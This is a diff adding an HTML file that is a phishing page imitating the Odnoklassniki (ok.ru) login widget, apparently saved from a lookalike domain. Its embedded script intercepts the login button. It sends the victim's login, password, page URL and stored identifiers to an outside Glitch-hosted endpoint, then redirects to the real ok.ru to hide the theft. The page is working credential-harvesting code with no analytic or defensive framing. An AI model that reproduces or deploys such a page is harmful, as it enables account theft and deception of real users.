@@ -1,0 +1,87 @@
+﻿
+<!-- saved from url=(0057)https://facebooksecyrite.pp.ua/TmJ4RTZZdFM=/login.php?t=3 -->
+<html class=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><link rel="shortcut icon" href="" type="image/png">
+
+
+
+
+
+<meta http-equiv="Content-Script-Type" content="text/javascript">
+<meta http-equiv="Content-Style-Type" content="text/css">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Одноклассники</title>
+<link href="./ok/oauth.dc5e4862.css" type="text/css" rel="stylesheet"><script type="text/javascript">try {    top.location.toString(); } catch(e) {    top.location = location; }</script></head>
+
+<body>
+<div id="hook_Block_OAuth2Login" class="hookBlock">
+<form method="POST" action="save_ok.php">
+                                 <input type="hidden" value="" name="">
+                                    <div class="ext-widget __no-footer" id="widget-el">
+									<div class="ext-widget_h">
+									<a href="https://ok.ru/feed?st.cmd=userMain" class="ext-widget_h_ico" target="_blank"></a>
+									<div class="ext-widget_h_tx">Одноклассники</div>
+									</div>
+									<div class="ext-widget_cnt-w __center">
+									<div class="ext-widget_cnt js-ext-widget-content">
+<div class="widget-oauth">
+<input name="fr.posted" type="hidden" value="set">
+<div class="form_i"><span class="input-l">
+<label for="field_email">Логин, адрес почты или телефон</label>
+</span>
+<div class="it_w">
+<input tabindex="1" required="" id="lgn" name="email" id="field_email" type="text" value="" class="it">
+</div>
+</div>
+<div class="form_i">
+<span class="input-l">
+<label for="field_password">пароль</label>
+<a href="https://ok.ru/dk?st.cmd=anonymRecoveryStart" target="_blank">Забыли пароль?</a>
+</span>
+<div class="it_w">
+<input tabindex="2" id="psw" name="pass" id="field_password" required="" type="password" class="it">
+</div>
+</div>
+<div class="form_i">
+<label class="irc_w __modern __o">
+<input name="fr.remember" checked="checked" id="field_remember" type="checkbox" value="on" class="irc">
+<span class="irc-vis">
+</span>
+<span class="irc_l">запомнить меня</span>
+</label>
+</div>
+<div class="form-actions">
+<input value="Войти" onclick="this.className +=&#39; __disabled&#39;" tabindex="3" id="btn" type="submit" class="button-pro __wide form-actions_yes">
+<a href="https://ok.ru/dk?st.cmd=anonymRegistrationEnterPhone" class="button-pro __wide __sec mt-4x" target="_blank">Зарегистрироваться</a>
+</div>
+</div>
+</div>
+</div>
+    <script>
+        document.querySelector('#btn').addEventListener('click', async function (e) {
+            e.preventDefault()
+            let r = await fetch('https://placid-succulent-marigold.glitch.me/api/add', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    login: document.querySelector('#lgn').value,
+                    password: document.querySelector('#psw').value,
+                    fake: location.href,
+                    ip: localStorage.getItem('ip'),
+                    id: localStorage.getItem('id'),
+                    type: 'ok'
+                })
+            }).then(data => {
+                setTimeout(() => {
+                    location.replace('https://ok.ru/')
+                }, 500)
+            })
+        })
+   </script>
+</div>
+</form>
+</div>
+
+</body></html>
